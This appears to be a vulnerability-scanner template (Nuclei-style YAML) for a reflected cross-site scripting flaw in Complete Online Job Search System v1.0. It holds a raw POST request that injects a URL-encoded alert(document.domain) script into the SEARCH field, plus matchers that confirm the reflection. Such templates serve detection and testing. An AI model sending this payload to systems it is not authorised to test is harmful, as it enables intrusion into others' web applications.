id: eris-xss
info:
  author: arafatansari
  description: 'Complete Online Job Search System v1.0 is vulnerable to Reflected
    Cross Site Scripting via index.php?q=advancesearch.

    '
  metadata:
    verified: true
  name: Complete Online Job Search System v1.0 - Reflected Cross Site Scripting
  severity: medium
  tags: cve,cve2022,xss,eris
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'Result : <script>alert(document.domain)</script>'
    - ERIS
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /index.php?q=result&searchfor=advancesearch HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    SEARCH=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&COMPANY=&CATEGORY=&submit=Submit

    '
